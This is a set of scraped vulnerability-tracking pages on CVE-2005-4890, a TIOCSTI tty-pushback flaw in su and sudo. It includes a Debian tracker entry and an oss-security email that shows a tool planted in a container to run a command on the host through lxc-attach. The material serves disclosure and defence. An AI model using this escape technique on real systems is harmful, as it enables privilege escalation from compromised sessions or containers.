=== Content from bugzilla.suse.com_c7176563_20250126_050046.html ===


| Bugzilla – Invalid Bug ID |
| --- |

|  |
| --- |

* [Home](./)
* | [New](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fid%3DCVE-2005-4890)
* |
  [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

'CVE-2005-4890' is not a valid bug number
nor an alias to a bug.

Please press **Back** and try again.

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fid%3DCVE-2005-4890)
  + |
    [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

+ Legal:
+ [openSUSE](http://en.opensuse.org/Terms_of_site)
+ [SUSE](https://www.suse.com/company/legal/)



=== Content from github.com_d4b6ec8b_20250126_050049.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%3Fquery%3DCVE-2005-48)

**GitHub Advisory Database**

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%3Fquery%3DCVE-2005-48)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

# GitHub Advisory Database

Security vulnerability database inclusive of CVEs and GitHub originated security advisories from the world of open source software.

## GitHub reviewed advisories

* [All reviewed
  21,144](/advisories?query=CVE-2005-48+type%3Areviewed)
* [Composer
  4,333](/advisories?query=CVE-2005-48+type%3Areviewed+ecosystem%3Acomposer)
* [Erlang
  31](/advisories?query=CVE-2005-48+type%3Areviewed+ecosystem%3Aerlang)
* [GitHub Actions
  22](/advisories?query=CVE-2005-48+type%3Areviewed+ecosystem%3Aactions)
* [Go
  2,095](/advisories?query=CVE-2005-48+type%3Areviewed+ecosystem%3Ago)
* [Maven
  5,265](/advisories?query=CVE-2005-48+type%3Areviewed+ecosystem%3Amaven)
* [npm
  3,760](/advisories?query=CVE-2005-48+type%3Areviewed+ecosystem%3Anpm)
* [NuGet
  678](/advisories?query=CVE-2005-48+type%3Areviewed+ecosystem%3Anuget)
* [pip
  3,446](/advisories?query=CVE-2005-48+type%3Areviewed+ecosystem%3Apip)
* [Pub
  12](/advisories?query=CVE-2005-48+type%3Areviewed+ecosystem%3Apub)
* [RubyGems
  892](/advisories?query=CVE-2005-48+type%3Areviewed+ecosystem%3Arubygems)
* [Rust
  882](/advisories?query=CVE-2005-48+type%3Areviewed+ecosystem%3Arust)
* [Swift
  37](/advisories?query=CVE-2005-48+type%3Areviewed+ecosystem%3Aswift)

## Unreviewed advisories

* [All unreviewed
  242,536](/advisories?query=CVE-2005-48+type%3Aunreviewed)

[CC-BY-4.0 License](https://docs.github.com/en/github/site-policy/github-additional-product-terms#12-advisory-database)
[Language support](https://docs.github.com/code-security/security-advisories/working-with-global-security-advisories-from-the-github-advisory-database/about-the-github-advisory-database#github-reviewed-advisories)
[About GitHub Advisory Database](https://docs.github.com/code-security/security-advisories/working-with-global-security-advisories-from-the-github-advisory-database/about-the-github-advisory-database)

Filter advisories

### Filter advisories

GitHub reviewed advisories
[All reviewed

5,000+](/advisories?query=CVE-2005-48+type%3Areviewed)
[Composer

4,333](/advisories?query=CVE-2005-48+type%3Areviewed+ecosystem%3Acomposer)
[Erlang

31](/advisories?query=CVE-2005-48+type%3Areviewed+ecosystem%3Aerlang)
[GitHub Actions

22](/advisories?query=CVE-2005-48+type%3Areviewed+ecosystem%3Aactions)
[Go

2,095](/advisories?query=CVE-2005-48+type%3Areviewed+ecosystem%3Ago)
[Maven

5,000+](/advisories?query=CVE-2005-48+type%3Areviewed+ecosystem%3Amaven)
[npm

3,760](/advisories?query=CVE-2005-48+type%3Areviewed+ecosystem%3Anpm)
[NuGet

678](/advisories?query=CVE-2005-48+type%3Areviewed+ecosystem%3Anuget)
[pip

3,446](/advisories?query=CVE-2005-48+type%3Areviewed+ecosystem%3Apip)
[Pub

12](/advisories?query=CVE-2005-48+type%3Areviewed+ecosystem%3Apub)
[RubyGems

892](/advisories?query=CVE-2005-48+type%3Areviewed+ecosystem%3Arubygems)
[Rust

882](/advisories?query=CVE-2005-48+type%3Areviewed+ecosystem%3Arust)
[Swift

37](/advisories?query=CVE-2005-48+type%3Areviewed+ecosystem%3Aswift)
Unreviewed advisories
[All unreviewed

5,000+](/advisories?query=CVE-2005-48+type%3Aunreviewed)

 Search

## 8 advisories

Filter by severity
Filter by CWE
Sort by

Severity

Filter by severity

[All severities](/advisories?query=CVE-2005-48)
[Low](/advisories?query=CVE-2005-48+severity%3Alow)
[Moderate](/advisories?query=CVE-2005-48+severity%3Amoderate)
[High](/advisories?query=CVE-2005-48+severity%3Ahigh)
[Critical](/advisories?query=CVE-2005-48+severity%3Acritical)

CWE

 Loading

Sort

Sort by

[Newest](/advisories?query=CVE-2005-48)
[Oldest](/advisories?query=CVE-2005-48+sort%3Apublished-asc)
[Recently updated](/advisories?query=CVE-2005-48+sort%3Aupdated-desc)
[Least recently updated](/advisories?query=CVE-2005-48+sort%3Aupdated-asc)

[Integer overflow in pcre\_compile.c in Perl Compatible Regular Expressions (PCRE) before 6.2, as...](/advisories/GHSA-h9j2-347v-3v58)
High

Unreviewed

CVE-2005-2491

was published
May 3, 2022

[Multiple interpretation error in Fortinet 2.48.0.0 allows remote attackers to bypass virus...](/advisories/GHSA-9f4x-rfqp-3c2c)
Moderate

Unreviewed

CVE-2005-3400

was published
May 1, 2022

[Multiple buffer overflows in AhnLab V3 AntiVirus V3Pro 2004 before 6.0.0.488, V3Net for Windows...](/advisories/GHSA-f3wx-hx63-wcc9)
High

Unreviewed

CVE-2005-3284

was published
May 1, 2022

[Integer signedness error in the administrative interface for Symantec AntiVirus Scan Engine 4.0...](/advisories/GHSA-7pc3-f52v-pph8)
High

Unreviewed

CVE-2005-2758

was published
May 1, 2022

[The InstallTrigger.install method in Firefox before 1.0.5 and Mozilla before 1.7.9 allows remote...](/advisories/GHSA-5v66-4mqr-49xj)
Moderate

Unreviewed

CVE-2005-2263

was published
May 1, 2022

[Raritan Dominion SX (DSX) Console Servers DSX16, DSX32, DSX4, DSX8, and DSXA-48 set (1) world...](/advisories/GHSA-5hmj-phhp-xxgh)
Moderate

Unreviewed

CVE-2005-2136

was published
May 1, 2022

[Directory traversal vulnerability in the pnModFunc function in pnMod.php for PostNuke 0.750...](/advisories/GHSA-5fxw-76jw-h76q)
Moderate

Unreviewed

CVE-2005-1621

was published
May 1, 2022

[fetchnews in leafnode 1.9.48 to 1.11.1 allows remote NNTP servers to cause a denial of service ...](/advisories/GHSA-3mvm-cfg4-h2w9)
Moderate

Unreviewed

CVE-2005-1453

was published
May 1, 2022

**ProTip!**
Advisories are also available from the
[GraphQL API](https://docs.github.com/graphql/reference/queries#securityadvisories)

[CC-BY-4.0 License](https://docs.github.com/en/github/site-policy/github-additional-product-terms#12-advisory-database)
[Language support](https://docs.github.com/code-security/security-advisories/working-with-global-security-advisories-from-the-github-advisory-database/about-the-github-advisory-database#github-reviewed-advisories)
[About GitHub Advisory Database](https://docs.github.com/code-security/security-advisories/working-with-global-security-advisories-from-the-github-advisory-database/about-the-github-advisory-database)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.kb.cert.org_32705056_20250126_050048.html ===


search

menu

icon-carat-right

cmu-wordmark

* ×
* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

[[Carnegie Mellon University](https://www.cmu.edu)](https://www.cmu.edu/)

# [Software Engineering Institute](https://www.sei.cmu.edu/)

## CERT Coordination Center

* [Home](/vuls/)
* [Notes](/vuls/bypublished/desc/)
* [Search](/vuls/search/)
* [Report a Vulnerability](/vuls/report/)
* [Disclosure Guidance](/vuls/guidance/)
* [VINCE](/vince/)

* [Home](/vuls/)
* Current:  Search

## Search

#### Keyword

#### Vendor

#### Year

2024

2023

2022

2021

2020

2019

2018

2017

2016

2015

2014

2013

2012

2011

2010

2009

2008

2007

2006

2005

2004

2003

2002

2001

2000

more

less

Sponsored by [CISA.](https://www.cisa.gov/cybersecurity)

 [Download PGP Key](https://vuls.cert.org/confluence/pages/viewpage.action?pageId=25985026)

[Read CERT/CC Blog](https://insights.sei.cmu.edu/cert/)

[Learn about Vulnerability Analysis](https://www.sei.cmu.edu/research-capabilities/all-work/display.cfm?customel_datapageid_4050=21304)

Carnegie Mellon University

Software Engineering Institute

4500 Fifth Avenue

Pittsburgh, PA 15213-2612

412-268-5800

[Office Locations](http://www.sei.cmu.edu/locations/index.cfm) | [Additional Sites Directory](http://www.sei.cmu.edu/additional-sites-directory/index.cfm) | [Legal](https://vuls.cert.org/confluence/display/VIN/VINCE%2BCode%2Bof%2BConduct#VINCECodeofConduct-TermsofUse) | [Privacy Notice](https://www.sei.cmu.edu/legal/privacy-notice/index.cfm) | [CMU Ethics Hotline](https://www.cmu.edu/hr/ethics-hotline/) | [www.sei.cmu.edu](http://www.sei.cmu.edu)

©2025 Carnegie Mellon University

[Contact SEI](https://www.sei.cmu.edu/contact-us/)
#### Contact CERT/CC

 412-268-5800



=== Content from security-tracker.debian.org_36f6152f_20250125_011815.html ===

# CVE-2005-4890

| **Name** | CVE-2005-4890 |
| --- | --- |
| **Description** | There is a possible tty hijacking in shadow 4.x before 4.1.5 and sudo 1.x before 1.7.4 via "su - user -c program". The user session can be escaped to the parent session by using the TIOCSTI ioctl to push characters into the input buffer to be read by the next process. |
| **Source** | [CVE](https://www.cve.org/CVERecord?id=CVE-2005-4890) (at [NVD](https://nvd.nist.gov/vuln/detail/CVE-2005-4890); [CERT](https://www.kb.cert.org/vuls/byid?searchview=&query=CVE-2005-4890), [LWN](https://lwn.net/Search/DoSearch?words=CVE-2005-4890), [oss-sec](https://marc.info/?l=oss-security&s=CVE-2005-4890), [fulldisc](https://marc.info/?l=full-disclosure&s=CVE-2005-4890), [Red Hat](https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2005-4890), [Ubuntu](https://people.canonical.com/~ubuntu-security/cve/CVE-2005-4890), [Gentoo](https://bugs.gentoo.org/show_bug.cgi?id=CVE-2005-4890), SUSE [bugzilla](https://bugzilla.suse.com/show_bug.cgi?id=CVE-2005-4890)/[CVE](https://www.suse.com/security/cve/CVE-2005-4890/), GitHub [advisories](https://github.com/advisories?query=CVE-2005-4890)/[code](https://github.com/search?type=Code&q=%22CVE-2005-4890%22)/[issues](https://github.com/search?type=Issues&q=%22CVE-2005-4890%22), [web search](https://duckduckgo.com/html?q=%22CVE-2005-4890%22), [more](https://oss-security.openwall.org/wiki/vendors)) |
| **Debian Bugs** | [628843](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=628843), [657784](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=657784) |

## Vulnerable and fixed packages

The table below lists information on source packages.

| Source Package | Release | Version | Status |
| --- | --- | --- | --- |
| [shadow](/tracker/source-package/shadow) ([PTS](https://tracker.debian.org/pkg/shadow)) | bullseye | 1:4.8.1-1 | fixed |
|  | bookworm | 1:4.13+dfsg1-1 | fixed |
|  | sid, trixie | 1:4.16.0-7 | fixed |
| [sudo](/tracker/source-package/sudo) ([PTS](https://tracker.debian.org/pkg/sudo)) | bullseye (security), bullseye | 1.9.5p2-3+deb11u1 | fixed |
|  | bookworm | 1.9.13p3-1+deb12u1 | fixed |
|  | sid, trixie | 1.9.16p1-1 | fixed |

The information below is based on the following data on fixed versions.

| Package | Type | Release | Fixed Version | Urgency | Origin | Debian Bugs |
| --- | --- | --- | --- | --- | --- | --- |
| [shadow](/tracker/source-package/shadow) | source | (unstable) | 1:4.1.5-1 | low |  | [628843](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=628843) |
| [sudo](/tracker/source-package/sudo) | source | (unstable) | 1.7.4p4 | low |  | [657784](https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=657784) |

## Notes

```
[squeeze] - shadow <no-dsa> (Minor issue)
[lenny] - shadow <no-dsa> (Minor issue)
<https://bugzilla.redhat.com/show_bug.cgi?id=173008>
sudo might be fixed earlier, use_pty present in stable. Only since 1.9.6-1~exp2
use_pty is added to default configuration.

```

---

Search for package or bug name:  [Reporting problems](/tracker/data/report)

[Home](/tracker/) - [Debian Security](https://www.debian.org/security/) - [Source](https://salsa.debian.org/security-tracker-team/security-tracker/blob/master/bin/tracker_service.py) [(Git)](https://salsa.debian.org/security-tracker-team/security-tracker)



=== Content from github.com_10abf94c_20250126_050019.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsearch%3Ftype%3DCode%26q%3D%2522CVE-2005-4890%2522)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

"CVE-2005-4890"

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsearch%3Ftype%3DCode%26q%3D%2522CVE-2005-4890%2522)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fsearch&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

# code Search Results · "CVE-2005-4890"

## Filter by

* + [Code... (...)results](https://github.com/search?type=code&q=%22CVE-2005-4890%22)
  + [Repositoriesresults](https://github.com/search?type=repositories&q=%22CVE-2005-4890%22)
  + [Issuesresults](https://github.com/search?type=issues&q=%22CVE-2005-4890%22)
  + [Pull requestsresults](https://github.com/search?type=pullrequests&q=%22CVE-2005-4890%22)
  + [Discussionsresults](https://github.com/search?type=discussions&q=%22CVE-2005-4890%22)
  + [Usersresults](https://github.com/search?type=users&q=%22CVE-2005-4890%22)
  + More
* [Advanced search](https://github.com/search/advanced)
Code... (...)Filter![Mona looking through a globe hologram for code](/images/modules/search/light.png)Sign in to search code on GitHubBefore you can access our code search functionality please sign in or create a free account.[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsearch%3Ftype%3DCode%26q%3D%2522CVE-2005-4890%2522)[Sign up](/signup?source=code_search_results)

You can’t perform that action at this time.



=== Content from www.openwall.com_c68b6c87_20250125_011812.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](4) [[next>]](6) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <2ECE9D9EEF1F524185270138AE23265947D57FCB@S0MSMAIL112.arc.local>
Date: Mon, 15 Dec 2014 18:00:54 +0000
From: Fiedler Roman <Roman.Fiedler@....ac.at>
To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
Subject: Re: Multiple disputed issues in util-vserver

> Von: Fiedler Roman [mailto:Roman.Fiedler@....ac.at]
>
> [Snip]
>
> > > Issue 3: It seems that handling of open tty FDs on enter, that allows
to
> > > inject arbitrary keyboard input to be read by the parent process, also
> > > affects the tool to start the guest container. This seems to be the
same
> > > issue with "vserver start" as reported in [2] for vserver enter, which
> > > was classified as less relevant back than. My rating would be little
lower
> > > than 2 but still quite high for mass hosting: manual restart, e.g.
during
> > > maintenance, seems quite common to me.
> > >
> >
> > If I understand correctly, this (and the previous one) are
> > CVE-2005-4890, isn't it?.
> >
> > <http://www.halfdog.net/Security/2012/TtyPushbackPrivilegeEscalation>
>
> Yes, this is the stuff about the general problem, this issue is quite a
> similar one for su. In both cases (su and vserver), a tool used to enter
an
> possibly compromised, lower privileged context from a higher privileged
one
> fail.
>
> The CVE is only for su. For su it seems, that the issue is treated more a
> bug than expected feature, but it seems, that it is still not fixed for
> current Ubuntu release.
>
> For vserver ...
>
> > > From my point of view, those issues might be expected behavior as
claimed by
> > > the developers, ....>
> > > this is the state of discussion, so no bug.
> > > ... but if so it should be at least stated more clearly in
> > > documentation:
> > >
> > > a) never use any tools except vserver stop (to terminate the
container)
> to
> > > interact with a running and possibly compromised container from the
host
> > > b) only use network/socket-based tools to connect to processes inside
a
> > > possibly compromised guest, e.g. SSH.
> > > c) never start a possibly compromised container from interactive shell
> to
> > > avoid injection of shell commands
> > >
> > > Regarding documentation I would even vote for a solution d), that all
> those
> > > tools get a mandatory argument like
> > > '--i-know-entering-insecure-container-may-kill-my-host' so that it is
> not
> > > very likely, that someone will use those tools for something else then
> > > testing or nice-world administration.
> > >
> > > Opinions to issues 1-3?
> > >
> > > What about solutions?
> >
> > Halfdog (CC'ed) already suggested some possible solutions:
> > <http://www.paul.sladen.org/vserver/archives/201211/0011.html>
>
> This should handle the pty issues. But since it requires the admin not to
> forget to use the manual workaround EVERY TIME, therefore man page update
> should be done in any case. Fix with pty allocation (or detaching from pty
> for vserver start) would be best solution. Without technical fix a
> "--do-it-insecure" parameter would make it clear on command line, that I
> want to proceed knowing the risks.

As there was not really much feedback from the vserver side and as there are
quite more issues with vserver I hoped to get rid of all those issues using
LXC. At least issue 3 is also with lxc-attach is quite the same, but
documentation of lxc-attach does not mention the risks either (at least on
Ubuntu). Calling

# lxc-attach --name buildhost-trusty -- /bin/ls

will create file outside when e.g. /bin/ls was replaced with

/root/TtyPushbackSignaling --NoSignal -- "touch /xxx"

So I guess one should not use attach to run e.g. automatic updates in the
guest or something alike.

Download attachment "[smime.p7s](5/1)" of type "application/pkcs7-signature" (6344 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from github.com_d1dfbc5c_20250126_050024.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%3Fquery%3DCVE-2005-4890)

**GitHub Advisory Database**

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fadvisories%3Fquery%3DCVE-2005-4890)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fadvisories&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

# GitHub Advisory Database

Security vulnerability database inclusive of CVEs and GitHub originated security advisories from the world of open source software.

## GitHub reviewed advisories

* [All reviewed
  21,144](/advisories?query=CVE-2005-4890+type%3Areviewed)
* [Composer
  4,333](/advisories?query=CVE-2005-4890+type%3Areviewed+ecosystem%3Acomposer)
* [Erlang
  31](/advisories?query=CVE-2005-4890+type%3Areviewed+ecosystem%3Aerlang)
* [GitHub Actions
  22](/advisories?query=CVE-2005-4890+type%3Areviewed+ecosystem%3Aactions)
* [Go
